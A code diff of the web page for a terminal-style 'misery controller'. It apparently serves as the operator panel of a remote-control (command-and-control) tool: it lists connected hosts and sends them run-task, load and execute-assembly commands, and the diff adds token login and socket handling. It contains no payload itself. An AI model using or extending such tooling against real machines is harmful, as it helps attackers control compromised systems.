@@ -19,11 +19,15 @@
     <div style="max-width: 50%; flex: 50; letter-spacing: 1.25px; padding: 16px; background-color: whitesmoke;" class="connections"></div>
     <script>
         var currentId = "";
-        var socket = io();
+        var socket = null;
         var stage = 0;
         var cCount = 0;
 
         var terminal = $('div.cli').terminal({
+            login: password => {
+                socket = io({auth: {token: password}});
+                initializeSocket();
+            },
             send: function(message) {
                 this.echo('Message sent');
                 socket.emit('message', message);
@@ -31,16 +35,19 @@
                 jsConfetti.addConfetti()
             },
             echo: message => {
+                if(!socket){
+                    return;
+                }
                 socket.emit('echo', {id: currentId, message});
-            },
+            },  
             load: message => {
                 socket.emit('load', {id: currentId, fileName: message});
             },
             run: function(...args) {
-                socket.emit('run-task', {id: currentId, args});
+                socket.emit('run-task', {id: currentId, args: args.map(a => a.toString())});
             },
             execute_assembly: function(...args) {
-                socket.emit('execute-assembly', {id: currentId, args});
+                socket.emit('execute-assembly', {id: currentId, args: args.map(a => a.toString())});
             }
         }, {
             completion: true,            
@@ -48,45 +55,53 @@
             greetings: 'Welcome to misery controller'
         });
 
-        socket.on("echo", message => {
-            terminal.echo(message);
-        });
+        function initializeSocket(){
 
-        socket.on("latency-update", update => {
-            $(`#latency${update.id}`).html(
-                `<div style="padding-bottom: 4px;" id="latency${update.id}"><span style="text-transform: capitalize">Latency: </span>${update.latency} ms</div>`
-            )
-        });
+            socket.on("disconnect", () => {
+                terminal.echo('connection failed');
+                socket = null;
+            });
 
-        socket.on("connections", connections => {
+            socket.on("echo", message => {
+                terminal.echo(message);
+            });
 
-            if(cCount < connections.length){
-                const jsConfetti = new JSConfetti();
-                jsConfetti.addConfetti();
-            }
-            cCount = connections.length;
+            socket.on("latency-update", update => {
+                $(`#latency${update.id}`).html(
+                    `<div style="padding-bottom: 4px;" id="latency${update.id}"><span style="text-transform: capitalize">Latency: </span>${update.latency} ms</div>`
+                )
+            });
 
-            $("div.connections").html(connections.length + " open connections");
+            socket.on("connections", connections => {
 
-            connections.forEach(element => {
-                var contentString = "";
-                Object.keys(element).forEach(p => {
-                    contentString += `<div style="padding-bottom: 4px;"><span style="text-transform: capitalize">${p}: </span>${element[p]}</div>`
+                if(cCount < connections.length){
+                    const jsConfetti = new JSConfetti();
+                    jsConfetti.addConfetti();
+                }
+                cCount = connections.length;
+
+                $("div.connections").html(connections.length + " open connections");
+
+                connections.forEach(element => {
+                    var contentString = "";
+                    Object.keys(element).forEach(p => {
+                        contentString += `<div style="padding-bottom: 4px;"><span style="text-transform: capitalize">${p}: </span>${element[p]}</div>`
+                    });
+                    contentString += `<div style="padding-bottom: 4px;" id="latency${element.socketId}"><span style="text-transform: capitalize">Latency: </span>Unknown</div>`
+                    $("div.connections").append(`<div class="connection-button" id="${element.id}"
+                    style="padding: 16px; background-color: whitesmoke; cursor: pointer; border-radius: 5px;
+                    box-shadow: darkgrey 2px 3px 8px -4px; margin-top: 16px;">${contentString}</div>`);
                 });
-                contentString += `<div style="padding-bottom: 4px;" id="latency${element.socketId}"><span style="text-transform: capitalize">Latency: </span>Unknown</div>`
-                $("div.connections").append(`<div class="connection-button" id="${element.id}"
-                style="padding: 16px; background-color: whitesmoke; cursor: pointer; border-radius: 5px;
-                box-shadow: darkgrey 2px 3px 8px -4px; margin-top: 16px;">${contentString}</div>`);
-            });
-            $("div.connection-button").click(function(){
-                
-                if(currentId && currentId.length) $(`#${currentId}`).removeClass("current-connection");
-                currentId = this.id;
-                $(`#${currentId}`).addClass("current-connection");
-                terminal.set_prompt(currentId + "[[gb;red;black]>] ");
-            });
+                $("div.connection-button").click(function(){
+                    
+                    if(currentId && currentId.length) $(`#${currentId}`).removeClass("current-connection");
+                    currentId = this.id;
+                    $(`#${currentId}`).addClass("current-connection");
+                    terminal.set_prompt(currentId + "[[gb;red;black]>] ");
+                });
 
-        });
+            });
+        }
         </script>
 </body>
 </html>
